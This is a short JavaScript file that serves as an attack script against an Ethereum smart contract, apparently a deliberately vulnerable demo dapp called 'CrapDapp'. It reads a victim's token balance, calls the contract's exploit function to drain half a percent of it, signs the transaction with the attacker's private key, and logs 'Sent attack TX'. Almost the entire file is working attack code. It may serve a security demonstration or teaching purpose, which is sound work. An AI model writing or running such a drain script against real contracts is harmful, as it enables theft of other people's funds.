'use strict'
require('colors');
const process = require('process');
const BigNumber = require('bignumber.js');
const FlexContract = require('flex-contract');
const DAPP_ABI = require('./CrapDapp.abi.json');

const env = require('./env');

const DRAIN_PCT = 0.005;

(async () => {
    const dapp = new FlexContract(DAPP_ABI, { address: env.dapp, providerURI: env.providerURI });
    const balance = await dapp.getVictimBalance(env.token, env.victim).call({ from: env.attacker });
    const amount = new BigNumber(balance).times(DRAIN_PCT).integerValue();
    const tx = dapp.exploit(env.token, env.victim, amount).send({ key: env.attackerPrivateKey });
    const txId = await tx.txId;
    console.log(`Sent attack TX ${txId.bold}!`);
    const receipt = await tx;
    console.log(`Transaction mined.`);
    process.exit(0);
})();
